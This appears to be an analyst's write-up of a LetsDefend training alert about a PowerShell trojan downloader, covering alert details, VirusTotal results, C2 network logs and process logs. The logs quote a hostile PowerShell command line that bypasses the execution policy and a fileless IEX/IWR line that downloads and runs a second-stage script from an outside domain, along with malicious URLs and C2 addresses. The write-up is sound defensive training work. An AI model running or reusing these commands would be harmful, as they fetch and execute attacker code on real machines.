# SOC153 - Suspicious Powershell Script Executed

**Reported by:** Nizamudheen KN  
**Completed date:** 13-03-2026  

---

## Executive Summary

On March 14, 2024 at 05:23 PM, a suspicious PowerShell 
script (payload_1.ps1) was detected executing on the 
endpoint hostname Tony (172.16.17.206). 

The malware was delivered via a phishing link, which 
caused the user to unknowingly download the malicious 
script from the internet through Chrome browser. Upon 
execution, the script successfully established 
communication with attacker-controlled Command and 
Control (C2) infrastructure and attempted to deploy 
a second stage payload using fileless execution techniques.

The Antivirus detected the threat but failed to block 
it, leaving the machine actively compromised.

Verdict   : True Positive
Attack    : PowerShell Trojan Downloader
Severity  : Critical
Status    : NOT Contained

## 2. Alert Details

| Field | Value |
|---|---|
| **Event ID** | 238 |
| **Rule Name** | SOC153 - Suspicious PowerShell Script Executed |
| **Date & Time** | March 14, 2024, 05:23 PM |
| **Hostname** | Tony |
| **IP Address** | 172.16.17.206 |
| **File Name** | payload_1.ps1 |
| **File Path** | C:\Users\LetsDefend\Downloads\payload_1.ps1 |
| **File Hash** | db8be06ba6d2d3595dd0c86654a48cfc4c0c5408fdd3f4e1eaf342ac7a2479d0 |
| **AV/EDR Action** | Detected (NOT Blocked) |
| **Alert Type** | Malware |
| **Severity** | Medium (Escalated to Critical) |

## 3. Analysis

### 3.1 File Hash Analysis (VirusTotal)

| Field | Value |
|---|---|
| **Hash** | db8be06ba6d2d3595dd0c86654a48cfc4c0c5408fdd3f4e1eaf342ac7a2479d0 |
| **Detection Score** | 33/62 vendors flagged as malicious |
| **Popular Threat Label** | trojan.powershell/boxter |
| **Threat Categories** | Trojan, Downloader |
| **Family Labels** | powershell, boxter, azorult |
| **File Size** | 7.14 KB |
| **Known Names** | agent3.ps1, payload_1.ps1 |
| **Community Score** | -1 |

#### Behaviour Tags
| Tag | Meaning |
|---|---|
| `powershell` | Abuses PowerShell engine |
| `detect-debug-environment` | Checks if running in sandbox to evade analysis |
| `exe-pattern` | Contains executable code patterns |
| `url-pattern` | Has hardcoded malicious URLs |
| `long-sleeps` | Sleeps randomly to evade behavioral detection |
| `checks-network-adapters` | Fingerprints the victim machine |

#### Notable Vendor Detections
| Vendor | Detection |
|---|---|
| AhnLab-V3 | Trojan/PowerShell.Downloader.SC205541 |
| DrWeb | PowerShell.Loader.3 |
| ESET-NOD32 | PowerShell/Injector.FH Trojan |
| Huorong | HEUR:Trojan/PS.AmsiBypass.a |
| Microsoft | Trojan:PowerShell/Azorult.RPAIMTB |
| Cynet | Malicious (score: 99) |

#### Contacted Infrastructure (Relations Tab)
| Type | Value | Detections | Note |
|---|---|---|---|
| URL | https://kionagranada.com/upload/beauty.exe | 9/98 | Stage 2 payload |
| Domain | kionagranada.com | 1/94 | Attacker delivery server |
| IP | 161.22.46.148 | 0/94 | C2 server — Spain |
| IP | 192.229.221.95 | 0/94 | Contacted IP |

> **Note:** 11 files dropped and 10+ additional files 
> identified — confirming multi-stage payload delivery.

### 3.2 Log Analysis

#### Connection 1 — Malware Download
| Field | Value |
|---|---|
| **Time** | Mar 14, 2024, 05:22 PM |
| **Source** | 172.16.17.206 (Tony) |
| **Destination IP** | 3.5.130.147 |
| **Destination Port** | 443 (HTTPS) |
| **Process** | chrome.exe |
| **URL** | https://files-ld.s3.us-east-2.amazonaws.com/payload_1.ps1 |
| **Action** | Allowed |

> Tony downloaded payload_1.ps1 via Chrome 
> browser from an AWS S3 link — most likely 
> delivered via a phishing email or malicious link.

#### Connection 2 — C2 Check-in
| Field | Value |
|---|---|
| **Time** | Mar 14, 2024, 05:23 PM |
| **Source** | 172.16.17.206 (Tony) |
| **Destination IP** | 91.236.116.163 |
| **Destination Port** | 80 (HTTP) |
| **Process** | powershell.exe |
| **URL** | HTTP://91.236.116.163/INDEX.PHP?ID=90059C37&SUBID=9G6CLLE6 |
| **Status** | 200 (SUCCESS) |

> Malware successfully registered Tony's infected 
> machine with the attacker's C2 server using a 
> unique victim ID. Status 200 confirms the 
> attacker's server responded.

#### Connection 3 — Stage 2 C2
| Field | Value |
|---|---|
| **Time** | Mar 14, 2024, 05:23 PM |
| **Source** | 172.16.17.206 (Tony) |
| **Destination IP** | 161.22.46.148 |
| **Destination Port** | 443 (HTTPS) |
| **Process** | powershell.exe |
| **Status** | SUCCESS |

> PowerShell directly connected to attacker 
> infrastructure — direct proof of active 
> malware execution communicating with C2 server.

### 3.3 Execution Evidence

#### Log 1 — Process Creation (EventID 1)
| Field | Value |
|---|---|
| **EventID** | 1 (Process Create) |
| **Username** | LetsDefend |
| **Image** | C:\Windows\System32\WINDOWSPOWERSHELL\V1.0\powershell.exe |
| **CommandLine** | powershell.exe -Command "if((Get-ExecutionPolicy) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & 'C:\Users\LetsDefend\Downloads\payload_1.ps1'" |
| **Original Filename** | payload_1.ps1 |
| **Directory** | C:\Users\LetsDefend\Downloads\ |
| **Hash** | db8be06ba6d2d3595dd0c86654a48cfc4c0c5408fdd3f4e1eaf342ac7a2479d0 |
| **PID** | 4315 |

> This log captures the exact moment payload_1.ps1 
> was executed. The malware first checked and bypassed 
> the PowerShell ExecutionPolicy security restriction 
> before running — a deliberate evasion technique.

#### Log 2 — Remote Command Execution (EventID 4104)
| Field | Value |
|---|---|
| **EventID** | 4104 (Execute a Remote Command) |
| **Username** | LetsDefend |
| **PID** | 6968 |
| **Script Block** | cmd.exe /c "powershell -command IEX(IWR -UseBasicParsing 'https://kionagranada.com/upload/sd2.ps1')" |

> The malware used IEX (Invoke-Expression) combined 
> with IWR (Invoke-WebRequest) to download and execute 
> sd2.ps1 directly in memory without saving to disk.
> This is a Fileless Malware technique designed to 
> evade antivirus tools that scan files on disk.

#### Log 3 — DNS Query (EventID 22)
| Field | Value |
|---|---|
| **EventID** | 22 (DNS Query) |
| **Source** | Sysmon |
| **Username** | Tony |
| **Query Name** | kionagranada.com |
| **Query Result** | 161.22.46.148 |
| **Process** | C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe |
| **Time** | Mar 14, 2024, 05:23 PM |

> PowerShell performed a DNS lookup for 
> kionagranada.com and resolved it to 161.22.46.148 
> — confirming the malware actively reached out to 
> the attacker's delivery server to download the 
> Stage 2 payload sd2.ps1.
